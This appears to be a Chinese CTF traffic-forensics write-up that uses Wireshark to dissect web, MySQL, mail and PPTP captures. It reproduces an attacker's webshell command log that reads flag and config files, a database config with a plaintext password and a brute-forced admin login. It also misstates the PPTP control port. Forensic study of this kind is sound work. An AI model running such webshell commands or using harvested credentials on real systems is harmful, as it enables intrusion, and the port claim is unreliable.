class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载了 /var/www/html/images/article/20180807wwmhxi.png</span></span><br><span class="line"><span class="comment"># ls /var/www/html/images/</span></span><br><span class="line">article/	2018-08-08 08:12:49	4096	0777</span><br><span class="line">../	2018-08-07 11:36:55	4096	0777</span><br><span class="line">./	2016-11-25 21:18:27	4096	0777</span><br><span class="line">product/	2018-07-04 09:12:01	4096	0777</span><br><span class="line">upload/	2016-11-25 21:18:27	4096	0777</span><br><span class="line"></span><br><span class="line"><span class="comment"># ls /var/</span></span><br><span class="line"><span class="comment"># cd&amp;获取了当前路径</span></span><br><span class="line">/var/www/html/images/article</span><br><span class="line"><span class="comment"># ls /var/www/html/images/article</span></span><br><span class="line">../	2016-11-25 21:18:27	4096	0777</span><br><span class="line">./	2018-08-08 08:12:49	4096	0777</span><br><span class="line">a.php	2018-08-08 08:12:49	28	0644</span><br><span class="line">a.png	2018-08-07 12:07:23	6322	0644</span><br><span class="line">20180807wwmhxi.png	2018-08-07 12:32:39	140235	0644</span><br><span class="line">1533559002.png	2018-08-07 12:07:13	6322	0644</span><br><span class="line"><span class="comment"># ls /var/www/html/</span></span><br><span class="line"><span class="comment"># cat /var/www/html/flag.flag</span></span><br><span class="line">9f08594fc1dcd0059936196bf2d090b7</span><br><span class="line"><span class="comment"># cat /var/www/html/robots.txt</span></span><br><span class="line">User-agent: *</span><br><span class="line">Disallow: /admin/</span><br><span class="line">Disallow: /cache/</span><br><span class="line">Disallow: /data/</span><br><span class="line">Disallow: /include/</span><br><span class="line">Disallow: /install/</span><br><span class="line">Disallow: /languages/</span><br><span class="line">Disallow: /m/include/</span><br><span class="line">Disallow: /m/theme/</span><br><span class="line">Disallow: /theme/</span><br><span class="line">Disallow: /upgrade/</span><br><span class="line">Disallow: /captcha.php</span><br><span class="line">flag:87b7cb79481f317bde90c116cf36084b</span><br><span class="line"></span><br><span class="line"><span class="comment"># cat /var/www/html/product_category.php</span></span><br><span class="line"><span class="comment"># cat /var/www/html/index.php</span></span><br><span class="line"><span class="comment"># ls /var/www/html/include/</span></span><br><span class="line"><span class="comment"># cat /var/www/html/include/init.php</span></span><br><span class="line"><span class="comment"># ls /var/www/html/data/</span></span><br><span class="line">slide/	2018-08-08 01:56:24	4096	0777</span><br><span class="line">../	2018-08-07 11:36:55	4096	0777</span><br><span class="line">./	2018-07-04 08:58:45	4096	0777</span><br><span class="line">backup/	2018-08-08 06:50:51	4096	0777</span><br><span class="line">.config.php.swp	2018-07-04 08:03:48	12288	0777</span><br><span class="line">config.php	2016-11-26 14:04:56	1086	0777</span><br><span class="line">index.html	2016-11-26 14:04:56	1	0777</span><br><span class="line">system.dou	2016-11-26 14:04:56	68	0777</span><br><span class="line"></span><br><span class="line"><span class="comment"># 数据库操作:show tables from web</span></span><br><span class="line"><span class="comment"># select * from dou_show</span></span><br><span class="line"><span class="comment"># select * from dou_product_category</span></span><br><span class="line"><span class="comment"># select * from dou_article_category</span></span><br><span class="line"><span class="comment"># cd &quot;/var/www/html/images/article/&quot;;ls;echo [S];pwd;echo [E]</span></span><br><span class="line"><span class="comment"># cd &quot;/var/www/html/images/article/&quot;;ifconfig;echo [S];pwd;echo [E]</span></span><br><span class="line">eth0      Link encap:Ethernet  HWaddr 00:0C:29:CB:9F:85  </span><br><span class="line">          inet addr:192.168.32.189  Bcast:192.168.32.255  Mask:255.255.255.0</span><br><span class="line">          inet6 addr: fe80::20c:29ff:fecb:9f85/64 Scope:Link</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:1599038 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:2032856 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1000 </span><br><span class="line">          RX bytes:476426339 (454.3 MiB)  TX bytes:1041835470 (993.5 MiB)</span><br><span class="line"></span><br><span class="line">eth1      Link encap:Ethernet  HWaddr 00:0C:29:CB:9F:8F  </span><br><span class="line">          inet addr:10.3.3.100  Bcast:10.3.3.255  Mask:255.255.255.0</span><br><span class="line">          inet6 addr: fe80::20c:29ff:fecb:9f8f/64 Scope:Link</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:1174416 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:1032202 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1000 </span><br><span class="line">          RX bytes:832835972 (794.2 MiB)  TX bytes:102428452 (97.6 MiB)</span><br><span class="line"></span><br><span class="line">lo        Link encap:Local Loopback  </span><br><span class="line">          inet addr:127.0.0.1  Mask:255.0.0.0</span><br><span class="line">          inet6 addr: ::1/128 Scope:Host</span><br><span class="line">          UP LOOPBACK RUNNING  MTU:65536  Metric:1</span><br><span class="line">          RX packets:2066 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:2066 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:0 </span><br><span class="line">          RX bytes:215082 (210.0 KiB)  TX bytes:215082 (210.0 KiB)</span><br></pre></td></tr></table></figure>
+
+<h4 id="robots-txt"><a href="#robots-txt" class="headerlink" title="robots.txt"></a>robots.txt</h4><p>上面在分析的时候其实也查到了····<code>http.request.full_uri matches &quot;robots.txt&quot;</code></p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407260529924.png" data-fancybox="true"/></div></div>
+
+<h4 id="数据库密码"><a href="#数据库密码" class="headerlink" title="数据库密码"></a>数据库密码</h4><p>查询常见数据库端口<code>tcp.dstport==3306</code></p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407260529969.png" data-fancybox="true"/></div></div>
+
+<p>选择文件–&gt;导出特定分组,先将mysql的导出来</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407260529801.png" data-fancybox="true"/></div></div>
+
+<p>然后打开mysql的流量看一下,并没有什么信息,这个是个Web网站,那账号密码有没有可能在配置文件里面,然后被黑客访问了呢~~~</p>
+<p>那么涉及到配置文件必然会涉及到数据库名、用户名、密码,例如:<code> http contains &quot;database&quot; and http contains &quot;user&quot; and http contains &quot;name&quot;</code>或者<code> http contains &quot;database&quot;  || http contains &quot;user&quot; || http contains &quot;name&quot;</code></p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407260529818.png" data-fancybox="true"/></div></div>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// database host</span></span><br><span class="line"><span class="variable">$dbhost</span>   = <span class="string">&quot;10.3.3.101&quot;</span>;</span><br><span class="line"><span class="comment">// database name</span></span><br><span class="line"><span class="variable">$dbname</span>   = <span class="string">&quot;web&quot;</span>;</span><br><span class="line"><span class="comment">// database username</span></span><br><span class="line"><span class="variable">$dbuser</span>   = <span class="string">&quot;web&quot;</span>;</span><br><span class="line"><span class="comment">// database password</span></span><br><span class="line"><span class="variable">$dbpass</span>   = <span class="string">&quot;e667jUPvJjXHvEUv&quot;</span>;</span><br><span class="line"><span class="comment">// table prefix</span></span><br><span class="line"><span class="variable">$prefix</span>   = <span class="string">&quot;dou_&quot;</span>;</span><br><span class="line"><span class="comment">// charset</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DOU_CHARSET&#x27;</span>,<span class="string">&#x27;utf-8&#x27;</span>);</span><br><span class="line"><span class="comment">// administrator path</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;ADMIN_PATH&#x27;</span>,<span class="string">&#x27;admin&#x27;</span>);</span><br><span class="line"><span class="comment">// mobile path</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;M_PATH&#x27;</span>,<span class="string">&#x27;m&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<h4 id="网卡信息"><a href="#网卡信息" class="headerlink" title="网卡信息"></a>网卡信息</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">eth0      Link encap:Ethernet  HWaddr 00:0C:29:CB:9F:85  </span><br><span class="line">          inet addr:192.168.32.189  Bcast:192.168.32.255  Mask:255.255.255.0</span><br><span class="line">          inet6 addr: fe80::20c:29ff:fecb:9f85/64 Scope:Link</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:1599038 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:2032856 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1000 </span><br><span class="line">          RX bytes:476426339 (454.3 MiB)  TX bytes:1041835470 (993.5 MiB)</span><br><span class="line"></span><br><span class="line">eth1      Link encap:Ethernet  HWaddr 00:0C:29:CB:9F:8F  </span><br><span class="line">          inet addr:10.3.3.100  Bcast:10.3.3.255  Mask:255.255.255.0</span><br><span class="line">          inet6 addr: fe80::20c:29ff:fecb:9f8f/64 Scope:Link</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:1174416 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:1032202 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1000 </span><br><span class="line">          RX bytes:832835972 (794.2 MiB)  TX bytes:102428452 (97.6 MiB)</span><br><span class="line"></span><br><span class="line">lo        Link encap:Local Loopback  </span><br><span class="line">          inet addr:127.0.0.1  Mask:255.0.0.0</span><br><span class="line">          inet6 addr: ::1/128 Scope:Host</span><br><span class="line">          UP LOOPBACK RUNNING  MTU:65536  Metric:1</span><br><span class="line">          RX packets:2066 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:2066 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:0 </span><br><span class="line">          RX bytes:215082 (210.0 KiB)  TX bytes:215082 (210.0 KiB)</span><br></pre></td></tr></table></figure>
+
+<h3 id="webtwo-pcap"><a href="#webtwo-pcap" class="headerlink" title="webtwo.pcap"></a>webtwo.pcap</h3><h4 id="hash-code"><a href="#hash-code" class="headerlink" title="hash_code"></a>hash_code</h4><p>发现只有MySQL协议,随便打开一个包看看格式和有哪些内容</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407271054632.png" data-fancybox="true"/></div></div>
+
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407271054324.png" data-fancybox="true"/></div></div>
+
+<p>我们可以按照这个格式查一下<code>mysql.query matches &quot;hash_code&quot;</code></p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407271054979.png" data-fancybox="true"/></div></div>
+
+<p>右键追踪<code>TCP</code>流</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407271054929.png" data-fancybox="true"/></div></div>
+
+<h4 id="ijnu密码"><a href="#ijnu密码" class="headerlink" title="ijnu密码"></a>ijnu密码</h4><p><code>mysql contains &quot;ijnu@test.com&quot;</code></p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407271054240.png" data-fancybox="true"/></div></div>
+
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407271054382.png" data-fancybox="true"/></div></div>
+
+<h3 id="mail-pcap"><a href="#mail-pcap" class="headerlink" title="mail*.pcap"></a>mail*.pcap</h3><p>协议分级,看看自己要关注那些协议和字段</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407271425614.png" data-fancybox="true"/></div></div>
+
+<p>映入眼帘的就是一个敏感路径</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407271425917.png" data-fancybox="true"/></div></div>
+
+<p>根据敏感路径进行过滤<code>http.request.full_uri matches &quot;action=login&quot; ||http.response_for.uri  matches &quot;action=login&quot; </code>分析请求及响应信息</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407271426661.png" data-fancybox="true"/></div></div>
+
+<p>发现一个<code>success:true</code>,右键追踪流,确实是登录成功了,但是没有请求体,估计是<code>Cookie</code>登录的.放弃QAQ不过又多了个筛选条件</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407271426324.png" data-fancybox="true"/></div></div>
+
+<p><code>http.request.full_uri matches &quot;action=login&quot; || (http.response_for.uri matches &quot;action=login&quot; &amp;&amp; data-text-lines matches &quot;&#123;\&quot;success\&quot;:true&#125;&quot;)</code></p>
+<p>将<code>value</code>应用为列,排查一下,最终会发现只是都满足了<code>resquest</code>包含了<code>action=login</code>而已,打开另一个数据包进行排查</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407271426028.png" data-fancybox="true"/></div></div>
+
+<p>可以发现爆破了<code>admin</code>的密码</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407271426823.png" data-fancybox="true"/></div></div>
+
+<p>追踪流,看着密码像<code>base64</code>编码,但是解不出来</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407271426119.png" data-fancybox="true"/></div></div>
+
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407271426891.png" data-fancybox="true"/></div></div>
+
+<p>那就在当前流找找,看看有没有加密函数,最后发现了加密函数,但是可惜的是损坏了,函数不完整,根据这个密钥去搜搜还有没有其他流量包</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407271427171.png" data-fancybox="true"/></div></div>
+
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407271427470.png" data-fancybox="true"/></div></div>
+
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407271427660.png" data-fancybox="true"/></div></div>
+
+<p>可以得到以下信息:</p>
+<ul>
+<li><code>hash: md5(1234567812345678)</code>:<code>d959caadac9b13dcb3e609440135cf54</code></li>
+<li><code>iv(偏移量):1234567812345678</code></li>
+<li><code>模式:cbc</code></li>
+<li><code>字符集:utf8</code></li>
+</ul>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407271427513.png" data-fancybox="true"/></div></div>
+
+<h3 id="vpn-pcap"><a href="#vpn-pcap" class="headerlink" title="vpn*.pcap"></a>vpn*.pcap</h3><p>PPTP原理</p>
+<ul>
+<li>PPTP客户机使用动态分配的TCP端口号，与PPTP服务器使用的保留TCP端口号123建立控制连接（PPTP控制连接携带PPTP呼叫控制盒管理信息，用于维护PPTP隧道）。</li>
+<li>客户端与服务器通过控制连接来创建、维护、终止一条隧道。</li>
+<li>PPP帧的有效载荷经过加密、压缩或是两者的混合处理。</li>
+<li>使用通用路由封装GRE对PPP帧进行封装。</li>
+<li>将PPP帧封装进IP数据报文中。通过IP网络如Internet或其他企业准用INTRANET灯发送给PPTP服务器。</li>
+<li>服务器接收到PPTP数据包后进行常规处理。</li>
+</ul>
+<p>我们打开vpnone.pcap，发现vpnone.pcap应该只是在尝试登陆VPN.</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407271535149.png" data-fancybox="true"/></div></div>
+
+<p>查看vpntwo.pcap,在统计——&gt;IPV4中发现</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407271636985.png" data-fancybox="true"/></div></div>
+
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407271535440.png" data-fancybox="true"/></div></div>
+
+<p><code>0.3.4.96 、10.3.4.55 、10.3.4.3</code>出现的次数.最多接着查看一下协议分级</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407271636495.png" data-fancybox="true"/></div></div>
+
+<p>有smb服务,看看smb服务器的ip是哪个排除一下,可以看到原端口是445也就是smb的服务端口,那么服务器IP则为<code>10.3.4.96</code></p>
